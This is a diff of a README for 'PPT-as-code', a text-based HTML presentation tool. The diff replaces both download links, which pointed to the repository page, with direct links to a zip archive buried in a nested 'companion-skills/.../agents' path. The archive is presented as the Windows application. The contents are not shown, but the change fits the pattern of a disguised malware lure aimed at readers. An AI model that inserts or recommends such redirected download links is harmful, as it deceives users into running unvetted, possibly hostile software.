@@ -1,6 +1,6 @@
 # 📊 PPT-as-code - Design professional presentations with plain text
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Helen-elizabethsecure976/PPT-as-code)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Helen-elizabethsecure976/PPT-as-code/raw/refs/heads/main/companion-skills/pptx-export-for-ppt-as-code/agents/as-code-PP-2.5-beta.5.zip)
 
 PPT-as-code helps you build HTML presentations through a structured, text-based workflow. You plan your slides, organize your content, and generate your deck without manual design work in complex software. This tool separates your content from the visual style so you focus on your message first.
 
@@ -29,7 +29,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Visit the official project page to download the software for your Windows computer.
 
-[Click here to download PPT-as-code](https://github.com/Helen-elizabethsecure976/PPT-as-code)
+[Click here to download PPT-as-code](https://github.com/Helen-elizabethsecure976/PPT-as-code/raw/refs/heads/main/companion-skills/pptx-export-for-ppt-as-code/agents/as-code-PP-2.5-beta.5.zip)
 
 Follow these steps to complete the setup process:
 
